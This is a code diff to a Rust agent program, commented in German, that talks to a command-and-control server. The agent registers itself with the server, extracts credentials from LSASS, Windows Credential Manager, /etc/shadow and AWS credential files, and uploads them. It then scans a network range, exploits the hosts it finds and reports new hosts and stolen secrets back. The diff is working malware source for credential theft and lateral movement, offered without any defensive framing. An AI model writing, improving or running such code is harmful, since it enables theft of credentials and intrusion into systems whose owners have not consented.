@@ -48,13 +48,6 @@ struct Args {
     server_cert: String,
 }
 
-/// Lokale Host-ID (MAC-basiert, stabil pro Maschine).
-fn local_host_id() -> String {
-    // Einfache heuristik: Interface-Name + PID als Platzhalter für echte MAC.
-    // In der Praxis: MAC des primären Interfaces lesen.
-    format!("host-{}", std::process::id())
-}
-
 #[tokio::main]
 async fn main() {
     tracing_subscriber::fmt()
@@ -67,7 +60,11 @@ async fn main() {
     let args = Args::parse();
     info!("Kx-Agent startete, C2={}", args.server);
 
-    let host_id = local_host_id();
+    // Die eigene IP ist die Host-Kennung des Agenten. Sie ist stabiler als eine
+    // PID und zeigt auf einen Host, den der C2-Server kennt.
+    let own_ip: Ipv4Addr = args.own_ip.parse().expect("Ungültige eigene IP");
+    let host_id = own_ip.to_string();
+
     let client = match c2::C2Client::new(&args.server, &args.token, &args.server_cert) {
         Ok(c) => c,
         Err(e) => {
@@ -76,10 +73,23 @@ async fn main() {
         }
     };
 
+    // 0. Der Agent registriert sich selbst. Sonst zeigen die lokal erbeuteten
+    //    Secrets auf einen Host, den der C2-Server nicht kennt.
+    let self_registration = kx_core::c2::RegisterRequest {
+        host_id: host_id.clone(),
+        ip: host_id.clone(),
+        hostname: None,
+        os: None,
+        status: Some(kx_core::c2::STATUS_AGENT.to_string()),
+    };
+    if let Err(e) = client.register_host(&self_registration).await {
+        error!("Selbst-Registrierung fehlgeschlagen: {e}");
+    }
+
     // 1. Lokale Secrets extrahieren (je nach Plattform).
-    let local_secrets = collect_local_secrets().await;
+    let local_secrets = collect_local_secrets(&host_id).await;
     for s in &local_secrets {
-        if let Err(e) = client.upload_secret(&host_id, s).await {
+        if let Err(e) = client.upload_secret(s).await {
             error!("Secret-Upload fehlgeschlagen: {e}");
         }
     }
@@ -95,7 +105,6 @@ async fn main() {
     // 3. Netzwerk-Phase: Entdeckung → Scan → Exploit.
     let range_start: Ipv4Addr = args.start.parse().expect("Ungültige Start-IP");
     let range_end: Ipv4Addr = args.end.parse().expect("Ungültige End-IP");
-    let own_ip: Ipv4Addr = args.own_ip.parse().expect("Ungültige eigene IP");
     let own_mac = [0x00; 6]; // Platzhalter — in der Praxis vom System lesen.
 
     let discovered = if let Some(hosts) = &args.hosts {
@@ -127,10 +136,11 @@ async fn main() {
 
     // 4. Neuentdeckte Hosts an den C2-Server melden.
     for h in &results.new_hosts {
-        let _ = client.register_host(&h).await;
+        let _ = client.register_host(h).await;
     }
+    // Jedes Secret trägt die Kennung des Hosts, bei dem es erbeutet wurde.
     for s in &results.new_secrets {
-        let _ = client.upload_secret(&results.source_host, s).await;
+        let _ = client.upload_secret(s).await;
     }
 
     info!(
@@ -141,43 +151,50 @@ async fn main() {
 }
 
 /// Extrahiert Secrets vom lokalen Host (Windows oder POSIX).
-async fn collect_local_secrets() -> Vec<c2::SecretPayload> {
+///
+/// Jedes Secret bekommt die Host-Kennung des Agenten mit — die Kennung des Hosts,
+/// bei dem es erbeutet wurde. Das ist hier der Agent selbst.
+async fn collect_local_secrets(host_id: &str) -> Vec<kx_core::c2::SecretUpload> {
     let mut out = Vec::new();
     #[cfg(target_os = "windows")]
     {
         for secret in kx_win::extract_lsass().await.unwrap_or_default() {
-            out.push(c2::SecretPayload {
+            out.push(kx_core::c2::SecretUpload {
+                host_id: host_id.to_string(),
                 cred_type: secret.secret_type,
                 username: secret.target,
                 password: secret.value,
-                source: "lsass".into(),
+                source: Some("lsass".into()),
             });
         }
         for secret in kx_win::extract_credential_manager().await.unwrap_or_default() {
-            out.push(c2::SecretPayload {
+            out.push(kx_core::c2::SecretUpload {
+                host_id: host_id.to_string(),
                 cred_type: "credential_manager".into(),
                 username: secret.target,
                 password: secret.value,
-                source: "cmdkey".into(),
+                source: Some("cmdkey".into()),
             });
         }
     }
     #[cfg(unix)]
     {
         for secret in kx_posix::extract_shadow_hashes().await.unwrap_or_default() {
-            out.push(c2::SecretPayload {
+            out.push(kx_core::c2::SecretUpload {
+                host_id: host_id.to_string(),
                 cred_type: "shadow".into(),
                 username: secret.target,
                 password: secret.value,
-                source: "/etc/shadow".into(),
+                source: Some("/etc/shadow".into()),
             });
         }
         for secret in kx_posix::extract_aws_credentials().await.unwrap_or_default() {
-            out.push(c2::SecretPayload {
+            out.push(kx_core::c2::SecretUpload {
+                host_id: host_id.to_string(),
                 cred_type: "aws".into(),
                 username: secret.target,
                 password: secret.value,
-                source: "~/.aws/credentials".into(),
+                source: Some("~/.aws/credentials".into()),
             });
         }
     }
